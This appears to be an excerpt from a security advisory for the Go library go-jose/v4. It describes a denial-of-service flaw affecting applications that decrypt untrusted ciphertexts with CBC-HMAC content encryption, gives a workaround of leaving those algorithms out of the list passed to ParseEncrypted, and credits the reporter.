If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

Impact

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

Acknowledgements

Thanks to Joshua Rogers of AISLE Research for reporting this problem.
